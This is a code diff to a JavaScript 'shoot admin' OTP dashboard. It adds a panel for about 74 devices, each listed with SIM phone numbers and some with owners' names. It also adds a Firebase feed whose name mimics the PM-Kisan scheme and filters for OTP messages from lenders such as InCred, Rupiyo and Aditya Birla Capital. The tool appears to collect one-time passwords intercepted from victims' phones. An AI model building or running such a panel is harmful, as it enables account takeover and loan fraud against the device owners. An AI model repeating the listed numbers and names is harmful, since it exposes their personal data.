@@ -679,7 +679,7 @@
         }
         animateIntro();
 
-        // ========== FULL DEVICE LIST FOR SHOOT ADMIN 1 (as originally provided) ==========
+        // ========== FULL DEVICE LIST FOR SHOOT ADMIN 1 ==========
         const masterDevices = [
             { name: "Redmi A2", sim1: null, sim2: "9401489517" },
             { name: "Sitaram's A05", sim1: "8357907306", sim2: "7879400281" },
@@ -1101,6 +1101,84 @@
             { name: "Sitaram's A05", sim1: "8357907306", sim2: "7879400281" }
         ];
 
+        // ========== NEW DEVICE DATA FOR SHOOT ADMIN 397 ==========
+        const devices397Raw = [
+            { name: "Unknown Device 1", sim1: "9758850486", sim2: "9759653952" },
+            { name: "Unknown Device 2", sim1: "7310716778", sim2: null },
+            { name: "Unknown Device 3", sim1: "8958718121", sim2: null },
+            { name: "Unknown Device 4", sim1: null, sim2: "9811707798" },
+            { name: "Unknown Device 5", sim1: null, sim2: null },
+            { name: "Unknown Device 6", sim1: "8630130757", sim2: null },
+            { name: "V2416", sim1: "8630966649", sim2: null },
+            { name: "realme 12 Pro 5G", sim1: "9119021604", sim2: "9634992491" },
+            { name: "Unknown Device 9", sim1: "9105404839", sim2: null },
+            { name: "Galaxy M34 5G", sim1: "8679674066", sim2: null },
+            { name: "Unknown Device 11", sim1: "9666116915", sim2: null },
+            { name: "V2111", sim1: null, sim2: "9911416638" },
+            { name: "realme NARZO 70 Turbo 5G", sim1: "7973464324", sim2: null },
+            { name: "Unknown Device 14", sim1: "7701887732", sim2: "9756060800" },
+            { name: "Unknown Device 15", sim1: "8696592033", sim2: null },
+            { name: "Unknown Device 16", sim1: "8865073580", sim2: null },
+            { name: "POCO C61", sim1: null, sim2: "7383874455" },
+            { name: "Unknown Device 18", sim1: "9837580286", sim2: "7351477184" },
+            { name: "V2338", sim1: "7310784184", sim2: null },
+            { name: "Unknown Device 20", sim1: "8958160045", sim2: null },
+            { name: "Unknown Device 21", sim1: "9719857675", sim2: null },
+            { name: "Unknown Device 22", sim1: "9368393114", sim2: null },
+            { name: "Unknown Device 23", sim1: "6377642869", sim2: null },
+            { name: "Unknown Device 24", sim1: "9897721598", sim2: "8218833466" },
+            { name: "Unknown Device 25", sim1: "9917466029", sim2: null },
+            { name: "Unknown Device 26", sim1: "9058061608", sim2: null },
+            { name: "Unknown Device 27", sim1: null, sim2: null },
+            { name: "OPPO A77s", sim1: "8958987728", sim2: "8218827753" },
+            { name: "realme 12x 5G", sim1: "7535050195", sim2: null },
+            { name: "Unknown Device 30", sim1: "7983639366", sim2: null },
+            { name: "Unknown Device 31", sim1: "8285536557", sim2: null },
+            { name: "OPPO K12x 5G", sim1: "8679292452", sim2: null },
+            { name: "Unknown Device 33", sim1: "7351132619", sim2: null },
+            { name: "V2427", sim1: null, sim2: "9119005129" },
+            { name: "Galaxy A23", sim1: "7505679528", sim2: null },
+            { name: "Unknown Device 36", sim1: "8580583544", sim2: "8237753544" },
+            { name: "Unknown Device 37", sim1: "9927463425", sim2: "9760307129" },
+            { name: "Unknown Device 38", sim1: "8433423559", sim2: null },
+            { name: "Unknown Device 39", sim1: "9755721703", sim2: "9755131703" },
+            { name: "Unknown Device 40", sim1: "9368351406", sim2: null },
+            { name: "Unknown Device 41", sim1: "7248666212", sim2: null },
+            { name: "Unknown Device 42", sim1: "9634143646", sim2: "7290975561" },
+            { name: "Unknown Device 43", sim1: null, sim2: "9411246034" },
+            { name: "Unknown Device 44", sim1: null, sim2: "8449547733" },
+            { name: "Vikash kumar's A04s", sim1: "8057421553", sim2: null },
+            { name: "Unknown Device 46", sim1: "6398971041", sim2: null },
+            { name: "moto g54 5G", sim1: null, sim2: null },
+            { name: "OPPO A17", sim1: null, sim2: "8958511307" },
+            { name: "Unknown Device 49", sim1: "9528535580", sim2: "9760330465" },
+            { name: "Unknown Device 50", sim1: "7500780786", sim2: "9310829846" },
+            { name: "Unknown Device 51", sim1: "9756625530", sim2: null },
+            { name: "Vikash's A55", sim1: "7906559824", sim2: "9927130364" },
+            { name: "Unknown Device 53", sim1: null, sim2: null },
+            { name: "Unknown Device 54", sim1: "6351182169", sim2: "9157811529" },
+            { name: "CPH2179", sim1: null, sim2: null },
+            { name: "Unknown Device 56", sim1: null, sim2: null },
+            { name: "Unknown Device 57", sim1: "9761667745", sim2: "8630295982" },
+            { name: "Unknown Device 58", sim1: "8938972785", sim2: null },
+            { name: "OPPO A3 Pro 5G", sim1: "6398661890", sim2: "9045141615" },
+            { name: "DANISHHHH", sim1: null, sim2: "9996138962" },
+            { name: "V2238", sim1: "7906449330", sim2: "9548578780" },
+            { name: "Narrotam's F15", sim1: "9639900732", sim2: "8958489039" },
+            { name: "Unknown Device 63", sim1: null, sim2: null },
+            { name: "I2202", sim1: "9758681206", sim2: "8218708878" },
+            { name: "Unknown Device 65", sim1: "9627784495", sim2: null },
+            { name: "Unknown Device 66", sim1: null, sim2: null },
+            { name: "realme 9 5G Speed Edition", sim1: "9720728468", sim2: "9997368081" },
+            { name: "Unknown Device 68", sim1: "9720063498", sim2: null },
+            { name: "Unknown Device 69", sim1: "7065376367", sim2: "9871490695" },
+            { name: "moto g45 5G", sim1: "9140585757", sim2: "9599892603" },
+            { name: "OPPO Reno10 5G", sim1: "6395763883", sim2: "7417730786" },
+            { name: "TECNO SPARK Go 2024", sim1: null, sim2: "9278365659" },
+            { name: "Unknown Device 73", sim1: "9761469501", sim2: null },
+            { name: "Unknown Device 74", sim1: null, sim2: "8941890586" }
+        ];
+
         // Clean phone numbers (remove 91 prefix, keep 10 digits)
         function cleanPhoneNumber(num) {
             if (!num || typeof num !== 'string') return null;
@@ -1135,6 +1213,12 @@
             sim2: cleanPhoneNumber(d.sim2)
         }));
 
+        const devices397 = devices397Raw.map(d => ({
+            name: d.name,
+            sim1: cleanPhoneNumber(d.sim1),
+            sim2: cleanPhoneNumber(d.sim2)
+        }));
+
         // ========== PANEL CONFIGURATIONS ==========
         const panelConfigs = {
             "shoot admin 1": {
@@ -1161,6 +1245,11 @@
                 firebaseUrl: "https://ck-kumar3-default-rtdb.firebaseio.com/.json",
                 devices: devices205,
                 storagePrefix: "panel205"
+            },
+            "shoot admin 397": {
+                firebaseUrl: "https://pm-kisan-13gfh-default-rtdb.firebaseio.com/.json",
+                devices: devices397,
+                storagePrefix: "panel397"
             }
         };
 
@@ -1170,7 +1259,8 @@
             { name: "shoot admin 228", desc: "Full OTP Dashboard" },
             { name: "shoot admin 313", desc: "Full OTP Dashboard" },
             { name: "shoot admin 42", desc: "Full OTP Dashboard" },
-            { name: "shoot admin 205", desc: "Full OTP Dashboard" }
+            { name: "shoot admin 205", desc: "Full OTP Dashboard" },
+            { name: "shoot admin 397", desc: "Full OTP Dashboard" }
         ];
 
         function renderPanels(filter = "") {
@@ -1238,17 +1328,14 @@
             renderMailbox();
         }
 
-        // ========== UPDATED OTP DETECTION: Added Aditya Birla Capital ==========
+        // OTP detection (InCred, Rupiyo, Truecaller, Aditya Birla)
         function isDesiredOtp(msgObj) {
             if (!msgObj?.msg) return false;
             const sender = (msgObj.ph || "").toLowerCase();
             const text = msgObj.msg.toLowerCase();
-            // Existing services
             if ((sender === "cp-incmny-s" || sender === "cp- incmny -s") && text.includes("incred money")) return true;
             if (sender === "cp-ggmotp-s" && text.includes("rupiyo")) return true;
-            // Truecaller detection
             if (sender.includes("truecaller") || text.includes("truecaller code")) return true;
-            // Aditya Birla Capital detection (sender CP-ABCDTR-S or text contains "aditya birla capital")
             if (sender === "cp-abcdtr-s" || text.includes("aditya birla capital")) return true;
             return false;
         }
@@ -1388,4 +1475,3 @@
     </script>
 </body>
 </html>
-```
